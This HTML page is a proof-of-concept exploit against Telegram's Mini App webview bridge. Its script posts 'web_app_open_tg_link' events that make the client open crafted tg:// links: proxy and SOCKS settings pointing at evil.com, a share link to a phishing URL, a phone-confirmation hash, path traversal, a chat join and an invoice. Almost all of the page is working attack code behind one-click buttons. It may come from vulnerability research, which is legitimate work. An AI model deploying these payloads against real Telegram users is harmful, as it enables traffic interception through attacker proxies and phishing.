<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>openTgLink PoC v2</title>
<style>
body{background:#0a0a0a;color:#ddd;font:12px monospace;margin:0;padding:10px}
h2{color:#0f0;margin:0 0 4px 0}
#log{background:#111;padding:6px;max-height:280px;overflow:auto;white-space:pre-wrap;font:11px monospace}
button{display:block;width:100%;margin:3px 0;padding:8px;background:#222;color:#fff;border:1px solid #444;font:12px monospace;cursor:pointer;text-align:left}
button.fire{background:#4a0000;border-color:#f44;font-size:13px}
button.info{background:#002244;border-color:#08f;font-size:13px}
</style></head><body>
<h2>openTgLink — dangerous tg:// injections</h2>
<div id="log">Init...</div>
<div id="btns"></div>

<script>
const L=(s,c)=>{const e=document.getElementById('log');e.innerHTML+=`<span class="${c||''}">${s}</span>\n`;e.scrollTop=e.scrollHeight;};
if (!window.TelegramWebviewProxy) { L('NO BRIDGE','err'); }

const FIRE = (path, desc) => {
  L(`>>> ${desc}`);
  L(`    path_full="${path}"`);
  window.TelegramWebviewProxy.postEvent('web_app_open_tg_link', {path_full: path});
};

const TESTS = [

  { path: '/proxy/?server=evil.com&port=8080&secret=test',
    desc: 'PROXY injection → tg://proxy?server=evil.com&port=8080' },

  { path: '/socks/?server=evil.com&port=1080',
    desc: 'SOCKS injection → tg://socks?server=evil.com&port=1080' },

  { path: '/share/url/?url=https://evil.com/phish',
    desc: 'Share URL injection → tg://msg_url?url=https://evil.com' },

  { path: '/confirmphone/?hash=abc123',
    desc: 'Confirm phone injection → tg://confirmphone?hash=abc123' },

  { path: '/setlanguage/../../evil',
    desc: 'SetLanguage path traversal (regex blocks this?)' },

  { path: '/bg/ff0000',
    desc: 'Background color injection → tg://bg?color=ff0000' },

  { path: '/addstickers/evil_pack',
    desc: 'Sticker pack injection' },

  { path: '/joinchat/AAAAAAAA',
    desc: 'Join chat injection → tg://join?invite=...' },

  { path: '/invoice/invoice_slug',
    desc: 'Invoice injection → tg://invoice?slug=...' },

  { path: '/durov',
    desc: 'Normal user (control test)' },
];

document.getElementById('btns').innerHTML = TESTS.map((t,i) =>
  `<button class="${i<4?'fire':'info'}" onclick="FIRE('${t.path.replace(/'/g,"\\'")}','${t.desc}')">${t.desc}</button>`
).join('');
</script>
</body>
</html>
